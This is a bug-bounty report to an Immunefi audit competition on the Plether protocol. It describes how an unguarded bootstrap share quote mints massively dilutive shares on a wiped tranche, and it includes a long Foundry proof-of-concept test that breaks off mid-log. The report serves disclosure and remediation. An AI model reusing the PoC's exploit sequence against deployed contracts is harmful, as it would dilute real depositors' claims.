# \#99788 [SC-Critical] TrancheVault.quoteBootstrapDeposit lacks the zero-principal guard that estimateDepositShares enforces, minting massively diluted shares on a wiped tranche

**Submitted on Nov 15th 2026 at 09:06:33 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99788
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro
After Cecuro LOW-72, `estimateDepositShares` returns zero for a wiped tranche (zero principal, surviving supply) — no positive quote. `quoteBootstrapDeposit` skips that guard: `assets * (supply + 1000) / (principal + 1)` collapses to `amount * (supply + 1000)` on zero principal. The quote is executed, not indicative: assign/seed mint exactly those shares, giving the receiver ~the whole tranche and diluting wiped LPs' restoration claim to ~1/amount.

## Vulnerability Details

1. The guard LOW-72 added — and where it stops

Cecuro LOW-72 ("Pending depositor can receive impossible share quotes for a wiped tranche", Low/ACKNOWLEDGED, fix commit 8996755) established that a tranche with zero principal and surviving supply must not quote positive shares. The fix : "estimateDepositShares returns zero when projected deposit-pricing assets are zero and shares survive... Empty tranches with no shares still quote normally." The guarded function in `packages/perps/src/TrancheVault.sol` (LOW-72 audit location `TrancheVault.sol:1298-1308`):

```solidity
function estimateDepositShares(uint256 assets) public view returns (uint256) {
    uint256 pricingAssets = _depositPricingAssets();
    uint256 pricingSupply = accruedTotalSupply();
    if (pricingAssets == 0 && pricingSupply != 0) {
        return 0;                       // LOW-72 guard: impossible quote refused
    }
    return quoteDepositFromState(assets, pricingAssets, pricingSupply, 0);
}
```

The same contract's bootstrap quote — used by the pool for actual mints — has no such guard:

```solidity
function quoteBootstrapDeposit(uint256 assets) external view returns (uint256) {
    return _convertToSharesUsingAssets(assets, _depositPricingAssets(), Math.Rounding.Floor);
}

function _convertToSharesUsingAssets(
    uint256 assets, uint256 totalAssets_, Math.Rounding rounding
) internal view returns (uint256) {
    return Math.mulDiv(assets, accruedTotalSupply() + VIRTUAL_SHARES, totalAssets_ + 1, rounding);
}
```

with `VIRTUAL_SHARES = 1000` (TrancheVault.sol constant) and `_depositPricingAssets()` reading the pool's simulated deposit-side reconcile state (`POOL.getPendingDepositTrancheState()`), i.e. the same projected principal the LOW-72 guard keys on.

2. The pricing regimes

- `principal > 0` (healthy tranche): `shares = amount * (S + 1000) / (P + 1)` ≈ `amount * S / P` — receiver gets a pro-rata `amount / (P + amount)` slice. Correct.
- `principal == 0`, `supply == 0` (fresh tranche): `shares = 1000 * amount`; the receiver is the only holder, so the coefficient only sets the initial share scale. Harmless, and explicitly preserved by LOW-72 ("empty tranches still quote normally").
- `principal == 0`, `supply > 0` (wiped tranche): the denominator collapses to `1` and the quote is `amount * (S + 1000)` — an astronomically large share count. `estimateDepositShares` calls this exact state unquotable and returns zero; the bootstrap path executes it.

The vault even owns the predicate for this state — `_isTerminallyWiped()` (`totalSupply() > 0 && totalAssets() == 0`) and `_projectedTerminalWipe()` (same check against the pending pricing state) — and uses it to reject ordinary deposit requests in `_requireRequestDepositPreflight`. The bootstrap path references neither.

3. The quote is executed on-chain

`ITrancheVaultBootstrap` documents `quoteBootstrapDeposit` as pricing "under current vault pricing... according to fee-free deposit conversion semantics", and `bootstrapMint` as minting "after the pool has assigned matching principal". HousePool wires them together:

```solidity
uint256 shares = ITrancheVaultBootstrap(targetVault).quoteBootstrapDeposit(amount);
if (shares == 0) {
    revert HousePool__BootstrapSharesZero();
}
...
ITrancheVaultBootstrap(targetVault).bootstrapMint(shares, receiver);
```

and `bootstrapMint` is a bare `onlyPool` mint — no pricing or wipe checks:

```solidity
function bootstrapMint(uint256 shares, address receiver) external onlyPool {
    _mint(receiver, shares);
    lastDepositTime[receiver] = block.timestamp;
}
```

So on a wiped tranche the only backstop is `shares == 0`, which the exploding quote never triggers. The wipe state is the same documented, reachable, test-protected state as in the retained regression suite (`test_WipedTrancheRejectsNewDeposits`, `test_SeniorHighWaterMarkMustSurviveFullWipeout`): senior principal zeroed by losses with share supply surviving (Cecuro MED-12 describes it verbatim), plus quarantined `unassignedAssets` released through the owner-only assign path.

4. Damage arithmetic

Wiped senior tranche: `S = 1_000_000` shares outstanding (pre-wipe LPs), `seniorHighWaterMark = 100_000e6`, `seniorPrincipal = 0`, `unassignedAssets = 30_000e6` (6-decimal USG). Owner calls `assignUnassignedAssets(true, receiver)`:

```text
quote  = 30_000e6 * (1_000_000 + 1000) / (0 + 1) = 3.003e16 shares
supply after mint = 1_000_000 + 3.003e16 ≈ 3.003e16
receiver share of tranche = 3.003e16 / (3.003e16 + 1e6) ≈ 1 - 3.3e-11
```

The receiver captures ≈100% of the tranche's current NAV (his own `amount`, so no immediate theft) **and ≈100% of every future claim of the pre-existing LPs**:

- With the current `seniorHighWaterMark = amount` overwrite (see companion finding on `assignUnassignedAssets`), the surviving LPs' restoration gap is zeroed outright.
- Even if that overwrite is fixed to `HWM += amount` (mark 130_000e6, gap 100_000e6), future revenue restores principal that the receiver holds at ≈99.999999997%: the wiped LPs' 100_000 entitlement yields them ~1/30_000e6 of each restored dollar. The vault-level pricing defect destroys the restoration claim independently of the pool-level mark defect — fixing one leaves the other intact.

Ordinary deposits cannot do this: deposit requests are rejected on a terminally-wiped tranche (`_requireRequestDepositPreflight` → `TrancheVault__TerminallyWiped`) and by HousePool's zero-NAV/unassigned gates; ACCOUNTING_SPEC states "a wiped tranche cannot be silently revived by an ordinary asynchronous deposit". The bootstrap entry point is the one path that both revives a wiped tranche and prices the revival with the unguarded formula.

5. Fix direction

Apply the LOW-72 guard to the executed quote — in `quoteBootstrapDeposit`:

```solidity
uint256 pricingAssets = _depositPricingAssets();
if (pricingAssets == 0 && accruedTotalSupply() != 0) {
    return 0;   // or revert TrancheVault__TerminallyWiped / a dedicated error
}
return _convertToSharesUsingAssets(assets, pricingAssets, Math.Rounding.Floor);
```

HousePool's existing `shares == 0 → HousePool__BootstrapSharesZero` then makes `assignUnassignedAssets`/`initializeSeedPosition` revert on a wiped tranche instead of executing the dilution; fresh (zero-supply) tranches keep quoting normally, so seeding is unaffected. Recovery of a wiped senior tranche remains available through the engine recapitalization route, which Cecuro note "mints no new senior LP shares" and preserves the restoration mark (`max(recapitalizationTargetAssets, amount)`).

## Impact Details
Pricing/accounting logic flaw — an incomplete remediation. LOW-72 fixed the zero-principal quote defect on the indicative surface (`estimateDepositShares` and the lens) but the same defect remains live on the execution surface (`quoteBootstrapDeposit` → `bootstrapMint`), where the misquote is not merely displayed but minted. Preconditions are the same rare-but-modeled state as the companion assign finding: a wiped tranche (zero principal, surviving supply) with quarantined ownerless assets present and an owner bootstrap call; ordinary deposits and the estimate path are already protected, so only the owner-gated bootstrap entry is exposed. Impact when triggered is on-chain and silent: the receiver is minted `amount * (supply + 1000)` shares, capturing ~100% of the tranche and diluting the wiped LPs — whose entire post-wipe position is the high-water restoration claim — to ~1/amount of it. No event or revert marks the mispricing. The one-line guard (or reuse of `_projectedTerminalWipe`) restores consistency with the LOW-72 principle at zero migration cost; seeding of fresh tranches is unaffected because the guard, per LOW-72's own language, only bites when supply survives.

## References

- `packages/perps/src/TrancheVault.sol` — `estimateDepositShares` with the LOW-72 guard (audit location `TrancheVault.sol:1298-1308`), `quoteBootstrapDeposit` (same contract, immediately after `estimateMintAssets`/`estimate*` cluster), `bootstrapMint`, `_convertToSharesUsingAssets` with `VIRTUAL_SHARES = 1000`, `_depositPricingAssets` (reads `POOL.getPendingDepositTrancheState()`), `_isTerminallyWiped`/`_projectedTerminalWipe`, `_requireRequestDepositPreflight` terminal-wipe rejection.
- `packages/perps/src/interfaces/ITrancheVaultBootstrap.sol` — NatSpec: quote "under current vault pricing... fee-free deposit conversion semantics"; mint "after the pool has assigned matching principal".
- `packages/perps/src/HousePool.sol` — `assignUnassignedAssets` (audit locations `HousePool.sol:517-529`, `:630-634`), `initializeSeedPosition` (`:711-737`), both calling `quoteBootstrapDeposit` then `bootstrapMint` with only a `shares == 0` check.
- Cecuro LOW-72 ("Pending depositor can receive impossible share quotes for a wiped tranche", Low/ACKNOWLEDGED — "Addressed", fix commit 8996755; guard scope explicitly limited to `estimateDepositShares` and the request lens); ACCOUNTING_SPEC "a wiped tranche cannot be silently revived by an ordinary asynchronous deposit"; senior capacity section: assignment/seeding "does create new senior shares" while engine recapitalization "mints no new senior LP shares"; MED-12 (documents post-wipe `seniorPrincipal = 0` with surviving supply).
- Retained audit-regression tests: `TrancheVault` deposit preflight terminal-wipe rejection; `TrancheRecoveryBehavior.t.sol::AccountPriceCollateralRecoveryTest.test_WipedTrancheRejectsNewDeposits`, `::TerminalEconomicStateRecoveryTest.test_SeniorHighWaterMarkMustSurviveFullWipeout`.


## Proof of Concept

## Proof of Concept


create test file and run:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {MockUSDG} from "./mocks/MockUSDG.sol";
import {MockPyth} from "./mocks/MockPyth.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IPyth} from "@plether/shared/interfaces/IPyth.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title TrancheVault.quoteBootstrapDeposit lacks the LOW-72
///        zero-principal guard that estimateDepositShares enforces
/// @notice Fresh, from-scratch PoC. Deploys the full release stack, funds both
///         tranches, wipes the junior tranche exactly the way the waterfall
///         models it (trader profit absorbLoss: junior principal to zero with
///         share supply surviving), quarantines ownerless value through the
///         documented engine recapitalization route, and then executes the
///         owner-gated bootstrap assign on the wiped tranche. The executed
///         quote is `amount * (supply + 1000)` and it is minted.
contract BootstrapQuoteWipedTrancheTest is Test {
    // ------------------------------------------------------------------
    // Release parameters ("Initial release parameters")
    // ------------------------------------------------------------------
    uint256 internal constant CAP_PRICE = 2e8;
    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint256 internal constant MAX_SKEW_RATIO = 0.4e18;
    uint256 internal constant MAINT_MARGIN_BPS = 10;
    uint256 internal constant INIT_MARGIN_BPS = 20;
    uint256 internal constant FAD_MARGIN_BPS = 300;
    uint256 internal constant BASE_CARRY_BPS = 500;
    uint256 internal constant MIN_BOUNTY_ASSETS = 1e6;
    uint256 internal constant BOUNTY_BPS = 10;
    uint256 internal constant KEEPER_SHARE_BPS = 5_000;
    uint256 internal constant PROTOCOL_SHARE_BPS = 0;
    uint256 internal constant FROZEN_CLOSE_SPREAD_BPS = 50;

    // Single EURUSD feed normalized by a 1.10 base price: feed F -> basket F/1.10.
    int64 internal constant FEED_BASKET_1_00 = 110_000_000; // basket 1.00e8
    int64 internal constant FEED_BASKET_0_20 = 22_000_000; // basket 0.20e8

    // Scenario sizes (6-decimal USG unless noted).
    uint256 internal constant JUNIOR_DEPOSIT = 50_000e6; // victim junior LPs
    uint256 internal constant SENIOR_DEPOSIT = 150_000e6; // passive senior LP
    uint256 internal constant TRADER_MARGIN = 5_000e6;
    uint256 internal constant OPEN_MARGIN_DELTA = 2_000e6;
    // 650 lots = 650e20 size (18 decimals) -> $65,000 notional at basket 1.00.
    // A 1.00 -> 0.20 basket move realizes 650 * 0.80e8 = 52_000e6 profit,
    // which absorbs the whole junior principal (50_001e6) and 1_999e6 of senior.
    uint256 internal constant LONG_SIZE = 650e20;
    uint256 internal constant RECAP_AMOUNT = 50_000e6;
    // Indicative quote size used for the estimate-vs-bootstrap divergence.
    uint256 internal constant QUOTE_ASSETS = 10_000e6;

    // Anchor: Sunday 19 Nov 2023 23:00:00 UTC (18:00 New York, just after the
    // Sunday FX open, outside the FAD / oracle-frozen window). The 72h
    // pool-config timelock matures Wednesday 23:01 UTC and the scenario runs
    // Wednesday night, outside the Fri-17:00-NY .. Sun-17:00-NY window.
    uint256 internal constant BASE = 1_700_352_000 + 23 hours;
    uint256 internal constant T0 = BASE + 72 hours + 60;

    struct Stack {
        MockUSDG token;
        MockPyth pyth;
        MarginClearinghouse clearinghouse;
        CfdEngine engine;
        HousePool pool;
        TrancheVault seniorVault;
        TrancheVault juniorVault;
        CfdEngineLens engineLens;
        OrderRouter router;
        OrderLifecycleBook lifecycleBook;
    }

    address internal victim = makeAddr("victim"); // junior LP, wiped, shares survive
    address internal seniorLP = makeAddr("seniorLP"); // passive senior LP
    address internal trader = makeAddr("trader"); // realizes the wipeout profit
    address internal receiver = makeAddr("receiver"); // assign beneficiary
    address internal owner = makeAddr("owner"); // protocol owner
    address internal deployer = makeAddr("deployer"); // nonce-controlled deployer
    address internal seedReceiver = makeAddr("seedReceiver");

    bytes[] internal pythData;

    function setUp() public {
        pythData.push(bytes("pyth-payload"));
        vm.deal(address(this), 1 ether);
    }

    // ------------------------------------------------------------------
    // Deployment (documented wiring order)
    // ------------------------------------------------------------------

    function _computeCreateAddress(address acct, uint256 nonce) internal pure returns (address) {
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), acct, bytes1(uint8(nonce))))))
        );
    }

    function _deployStack() internal returns (Stack memory s) {
        vm.startPrank(owner);
        s.pyth = new MockPyth();
        s.token = new MockUSDG();
        s.clearinghouse = new MarginClearinghouse(address(s.token));
        s.engine = new CfdEngine(
            address(s.token),
            address(s.clearinghouse),
            CAP_PRICE,
            CfdTypes.RiskParams({
                vpiFactor: VPI_FACTOR,
                maxSkewRatio: MAX_SKEW_RATIO,
                maintMarginBps: MAINT_MARGIN_BPS,
                initMarginBps: INIT_MARGIN_BPS,
                fadMarginBps: FAD_MARGIN_BPS,
                baseCarryBps: BASE_CARRY_BPS,
                minBountyAssets: MIN_BOUNTY_ASSETS,
                bountyBps: BOUNTY_BPS,
                keeperShareBps: KEEPER_SHARE_BPS,
                protocolShareBps: PROTOCOL_SHARE_BPS
            }),
            FROZEN_CLOSE_SPREAD_BPS
        );
        vm.stopPrank();

        vm.startPrank(owner);
        TerminalNavBookV2 navBook = new TerminalNavBookV2(address(s.engine), uint32(CAP_PRICE));
        s.engine.setTerminalNavBook(address(navBook));

        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar sidecar = new CfdEngineSettlementSidecar(address(s.engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(s.engine), owner);
        s.engine.setDependencies(address(planner), address(sidecar), address(engineAdmin));

        HousePoolRedemptionMathSidecar redMath = new HousePoolRedemptionMathSidecar();
        s.pool = new HousePool(address(s.token), address(s.engine), address(redMath));
        s.engine.setPool(address(s.pool));

        s.seniorVault =
            new TrancheVault(IERC20(address(s.token)), address(s.pool), true, "Plether Senior", "PT-SR", 0, address(0));
        s.pool.setSeniorVault(address(s.seniorVault));

        address treasury = s.engine.protocolTreasury();
        s.juniorVault =
            new TrancheVault(IERC20(address(s.token)), address(s.pool), false, "Plether Junior", "PT-JR", 0, treasury);
        s.pool.setJuniorVault(address(s.juniorVault));

        s.clearinghouse.setEngine(address(s.engine));
        s.engineLens = new CfdEngineLens(address(s.engine));

        bytes32[] memory feedIds = new bytes32[](1);
        feedIds[0] = bytes32(uint256(0x455552555344)); // "EURUSD"
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 1e18;
        uint256[] memory basePrices = new uint256[](1);
        basePrices[0] = 110_000_000; // 1.10 USD -> basket mark 1.00 (8 decimals)
        bool[] memory inversions = new bool[](1);
        inversions[0] = false;
        PletherOracle oracle =
            new PletherOracle(address(s.engine), address(s.pool), address(s.pyth), feedIds, quantities, basePrices, inversions);

        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar executionSidecar = new OrderRouterExecutionSidecar();
        vm.stopPrank();

        // Strict nonce sequence: lifecycle book (n), keeper sidecar (n+1), router (n+2).
        vm.startPrank(deployer);
        uint64 nonceBefore = vm.getNonce(deployer);
        address predictedRouter = _computeCreateAddress(deployer, nonceBefore + 2);
        OrderLifecycleBook book =
            new OrderLifecycleBook(predictedRouter, address(s.engine), address(s.clearinghouse), address(s.pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        s.lifecycleBook = book;
        s.router = new OrderRouter(
            address(s.engine),
            address(s.engineLens),
            address(s.pool),
            address(oracle),
            address(keeperSidecar),
            address(evaluator),
            address(executionSidecar),
            address(book)
        );
        assertEq(address(s.router), predictedRouter, "router address prediction");
        vm.stopPrank();

        vm.prank(owner);
        s.engine.setOrderRouter(address(s.router));

        // Release pool config behind its 72h timelock (activateTrading rejects
        // the constructor's unbounded senior sentinels).
        vm.prank(owner);
        s.pool.proposePoolConfig(
            IHousePool.PoolConfig({
                seniorRateBps: 800,
                markStalenessLimit: 60,
                seniorFrozenLpFeeBps: 25,
                juniorFrozenLpFeeBps: 75,
                maxSeniorExposureAssets: 40_000_000e6,
                maxSeniorShareBps: 8_000
            })
        );
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    function _epochStart(uint256 ts) internal pure returns (uint256) {
        return (ts / 1 hours) * 1 hours;
    }

    function _bounds(Stack memory s) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + 120),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1, // Live
            expectedConfigHash: s.lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: 1e6,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _openRequest(Stack memory s, bytes32 clientOrderId, uint256 marginDelta)
        internal
        view
        returns (OrderV3Types.OrderRequest memory r)
    {
        r.clientOrderId = clientOrderId;
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = LONG_SIZE;
        r.marginDelta = marginDelta;
        r.targetPrice = 1;
        r.isClose = false;
        r.bounds = _bounds(s);
    }

    function _closeRequest(Stack memory s, bytes32 clientOrderId, uint256 sizeDelta)
        internal
        view
        returns (OrderV3Types.OrderRequest memory r)
    {
        r.clientOrderId = clientOrderId;
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = sizeDelta;
        r.marginDelta = 0;
        r.targetPrice = CAP_PRICE;
        r.isClose = true;
        r.bounds = _bounds(s);
    }

    function _settle(Stack memory s) internal {
        s.router.settleLpEpoch{value: 1 wei}(pythData);
    }

    // ------------------------------------------------------------------
    // PoC
    // ------------------------------------------------------------------

    function test_PoC_BootstrapQuoteOnWipedJuniorMintsAstronomicalShares() public {
        Stack memory s = _deployStack();

        emit log_string("=========================================================");
        emit log_string("PoC: quoteBootstrapDeposit lacks the LOW-72 zero-principal");
        emit log_string("guard - executed bootstrap mint on a wiped junior tranche");
        emit log_string("=========================================================");

        // Wednesday 23:01 UTC: the 72h pool-config timelock has matured.
        vm.warp(T0);
        vm.prank(owner);
        s.pool.finalizePoolConfig();

        // T0: keeper mark refresh installs the accepted basket (1.00) and the
        // engine mark before any pool accounting.
        s.pyth.setPrice(FEED_BASKET_1_00, 0);
        s.router.updateMarkPrice{value: 1 wei}(pythData);

        // Seeds ($1 each) and trading activation.
        vm.startPrank(owner);
        s.token.mint(owner, 2e6);
        s.token.approve(address(s.pool), 2e6);
        s.pool.initializeSeedPosition(false, 1e6, seedReceiver);
        s.pool.initializeSeedPosition(true, 1e6, seedReceiver);
        s.pool.activateTrading();
        vm.stopPrank();

        // Victim funds the junior tranche ($50k), then the senior LP funds the
        // senior tranche ($150k) once junior principal exists for the 80%
        // senior-share cap.
        s.token.mint(address(victim), JUNIOR_DEPOSIT);
        vm.startPrank(victim);
        s.token.approve(address(s.juniorVault), JUNIOR_DEPOSIT);
        uint256 juniorReq = s.juniorVault.requestDeposit(JUNIOR_DEPOSIT, victim, victim);
        vm.stopPrank();
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
        _settle(s);
        vm.prank(victim);
        s.juniorVault.claimDeposit(juniorReq, JUNIOR_DEPOSIT, victim, victim);

        s.token.mint(address(seniorLP), SENIOR_DEPOSIT);
        vm.startPrank(seniorLP);
        s.token.approve(address(s.seniorVault), SENIOR_DEPOSIT);
        uint256 seniorReq = s.seniorVault.requestDeposit(SENIOR_DEPOSIT, seniorLP, seniorLP);
        vm.stopPrank();
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60);
        _settle(s);
        vm.prank(seniorLP);
        s.seniorVault.claimDeposit(seniorReq, SENIOR_DEPOSIT, seniorLP, seniorLP);

        uint256 juniorPrincipalBefore = s.pool.juniorPrincipal();
        uint256 seniorPrincipalBefore = s.pool.seniorPrincipal();
        uint256 juniorSupplyBefore = s.juniorVault.accruedTotalSupply();
        uint256 seniorLPSharesBefore = s.seniorVault.balanceOf(seniorLP);
        emit log_string("---------------------------------------------------------");
        emit log_string("funded pool (6-decimal USG):");
        emit log_named_uint("junior principal (seed $1 + victim $50k)", juniorPrincipalBefore);
        emit log_named_uint("senior principal (seed $1 + senior $150k)", seniorPrincipalBefore);
        emit log_named_uint("junior share supply (seed + victim)", juniorSupplyBefore);
        assertGt(juniorPrincipalBefore, 0, "junior funded");
        assertGt(seniorPrincipalBefore, 0, "senior funded");

        // Trader opens a LONG (650 lots, $65k notional at basket 1.00). LONG
        // profits as the basket price falls. All warps below use one captured
        // timestamp (the optimizer may otherwise reuse stale block.timestamp
        // reads across vm.warp calls).
        uint256 tradeT = block.timestamp;
        s.token.mint(address(trader), TRADER_MARGIN);
        vm.startPrank(trader);
        s.token.approve(address(s.clearinghouse), TRADER_MARGIN);
        s.clearinghouse.depositMargin(TRADER_MARGIN);
        uint64 openId = s.router.commitOrder(_openRequest(s, bytes32(uint256(1)), OPEN_MARGIN_DELTA));
        vm.stopPrank();
        vm.warp(tradeT + 2);
        vm.roll(vm.getBlockNumber() + 1);
        s.router.executeOrder{value: 2 wei}(openId, pythData);
        (uint256 posSize,,,, CfdTypes.Side posSide,,) = s.engine.positions(trader);
        assertGt(posSize, 0, "trader position opened");
        assertEq(uint8(posSide), uint8(CfdTypes.Side.LONG), "trader is LONG");
        emit log_named_uint("trader LONG opened (18-dec size)", posSize);

        // Crash the basket 1.00 -> 0.20, then close and withdraw. The realized
        // profit (650 * 0.80e8 = 52_000e6) exceeds the junior principal, so
        // absorbLoss zeroes the junior tranche and impairs the senior by the
        // 1_999e6 remainder; the HWM survives.
        vm.warp(tradeT + 4);
        vm.roll(vm.getBlockNumber() + 1);
        s.pyth.setPrice(FEED_BASKET_0_20, 0);
        s.router.updateMarkPrice{value: 1 wei}(pythData);
        vm.startPrank(trader);
        uint64 closeId = s.router.commitOrder(_closeRequest(s, bytes32(uint256(2)), posSize));
        vm.stopPrank();
        vm.warp(tradeT + 6);
        vm.roll(vm.getBlockNumber() + 1);
        s.router.executeOrder{value: 2 wei}(closeId, pythData);
        vm.startPrank(trader);
        s.clearinghouse.withdrawMargin(s.clearinghouse.getAccountEquityAssets(trader));
        vm.stopPrank();

        // The wiped-junior state (LOW-72's exact target): projected deposit-
        // pricing principal is zero while the share supply survives.
        (uint256 seniorPricing, uint256 juniorPricing) = s.pool.getPendingDepositTrancheState();
        emit log_string("---------------------------------------------------------");
        emit log_string("after the wipeout (projected deposit-pricing state):");
        emit log_named_uint("junior pricing principal", juniorPricing);
        emit log_named_uint("senior pricing principal", seniorPricing);
        emit log_named_uint("junior share supply (survives the wipe)", s.juniorVault.accruedTotalSupply());
        assertEq(juniorPricing, 0, "junior tranche is wiped (zero pricing principal)");
        assertGt(seniorPricing, 0, "senior tranche remains");

        // ------------------------------------------------------------------
        // The core divergence: estimate refuses, the bootstrap quote explodes.
        // ------------------------------------------------------------------
        uint256 estimate = s.juniorVault.estimateDepositShares(QUOTE_ASSETS);
        uint256 supplyWiped = s.juniorVault.accruedTotalSupply();
        uint256 bootstrapQuote = s.juniorVault.quoteBootstrapDeposit(QUOTE_ASSETS);
        uint256 seniorQuote = s.seniorVault.quoteBootstrapDeposit(QUOTE_ASSETS);

        emit log_string("---------------------------------------------------------");
        emit log_named_uint("estimateDepositShares(10_000e6) on wiped junior", estimate);
        emit log_string("(LOW-72 guard: indicative quote refused -> 0)");
        emit log_named_uint("quoteBootstrapDeposit(10_000e6) on wiped junior", bootstrapQuote);
        emit log_named_uint("  = QUOTE_ASSETS * (supply + 1000) / (0 + 1)", QUOTE_ASSETS * (supplyWiped + 1000));
        emit log_named_uint("quoteBootstrapDeposit(10_000e6) on healthy senior", seniorQuote);
        emit log_string("(healthy tranche quotes pro-rata)");

        assertEq(estimate, 0, "LOW-72 guard: estimateDepositShares must return 0");
        assertEq(
            bootstrapQuote,
            QUOTE_ASSETS * (supplyWiped + 1000),
            "bootstrap quote = amount * (supply + 1000) on zero principal"
        );

        // Ordinary asynchronous deposits are refused on this exact state.
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TerminallyWiped.selector);
        s.juniorVault.requestDeposit(QUOTE_ASSETS, victim, victim);
        emit log_string("ordinary deposit on wiped junior: reverted TrancheVault__TerminallyWiped");

        // ------------------------------------------------------------------
        // Quarantine ownerless value through the documented engine
        // recapitalization route (senior is impaired; the recap first fills the
        // restoration gap and the remainder has no claimant -> unassigned).
        // ------------------------------------------------------------------
        s.token.mint(owner, RECAP_AMOUNT);
        vm.startPrank(owner);
        s.token.approve(address(s.engine), RECAP_AMOUNT);
        s.engine.recapitalizePool(RECAP_AMOUNT);
        vm.stopPrank();
        emit log_named_uint("engine.recapitalizePool by owner", RECAP_AMOUNT);
        emit log_named_uint("unassignedAssets before assign (pending bucket)", s.pool.unassignedAssets());

        // The mark pushed by the close execution (same timestamp) is fresh for
        // the assign's reconcile and freshness gate.

        // Executed nuance: the SENIOR assign is capacity-blocked on a wiped pool
        // (the release 80% senior-share ratio with zero junior principal leaves
        // zero senior admission capacity).
        vm.prank(owner);
        vm.expectRevert(IHousePool.HousePool__ExceedsSeniorDepositCapacity.selector);
        s.pool.assignUnassignedAssets(true, receiver);
        emit log_string("assignUnassignedAssets(true, ...): reverted HousePool__ExceedsSeniorDepositCapacity");
        emit log_string("(senior vector capacity-blocked; junior vector below)");

        // The executed bootstrap mint on the wiped junior tranche.
        vm.prank(owner);
        s.pool.assignUnassignedAssets(false, receiver);

        uint256 amount = s.pool.juniorPrincipal();
        uint256 receiverShares = s.juniorVault.balanceOf(receiver);
        uint256 totalSupplyAfter = s.juniorVault.totalSupply();
        uint256 victimShares = s.juniorVault.balanceOf(victim);

        emit log_string("---------------------------------------------------------");
        emit log_string("assignUnassignedAssets(false, receiver) executed:");
        emit log_named_uint("unassigned amount assigned", amount);
        emit log_named_uint("executed quote = amount * (supply + 1000) shares", amount * (supplyWiped + 1000));
        emit log_named_uint("shares minted to receiver", receiverShares);
        emit log_named_uint("junior principal after assign", s.pool.juniorPrincipal());
        emit log_named_uint("junior supply after assign", totalSupplyAfter);
        emit log_named_uint("unassignedAssets after assign", s.pool.unassignedAssets());
        emit log_named_uint("senior principal after assign", s.pool.seniorPrincipal());
        emit log_string("receiver share of junior tranche (1e9 = 100%):");
        emit log_named_uint("  receiverShares * 1e9 / total", (receiverShares * 1e9) / totalSupplyAfter);
        emit log_named_uint("victim residual share of tranche (1e18 = 100%)", (victimShares * 1e18) / totalSupplyAfter);

        // The executed quote is exactly the unguarded formula.
        assertEq(receiverShares, amount * (supplyWiped + 1000), "executed mint = amount * (supply + 1000)");
        // The receiver captured > 99.9999999% of the tranche.
        assertGt(receiverShares * 1e9, totalSupplyAfter * 999_999_999, "receiver owns ~100% of the tranche");
        // The wiped LPs' surviving supply is diluted to ~1/amount of it.
        assertLt((victimShares * 1e18) / totalSupplyAfter, 1e12, "victim diluted below 1e-6 of the tranche");
        // Quarantine fully consumed; senior LP shares untouched.
        assertEq(s.pool.unassignedAssets(), 0, "unassigned assets fully assigned");
        assertEq(s.seniorVault.balanceOf(seniorLP), seniorLPSharesBefore, "senior LP shares untouched");
        assertGt(s.pool.seniorPrincipal(), 140_000e6, "senior restored toward HWM by the recap");

        emit log_string("---------------------------------------------------------");
        emit log_string("With the LOW-72 guard in quoteBootstrapDeposit the quote would");
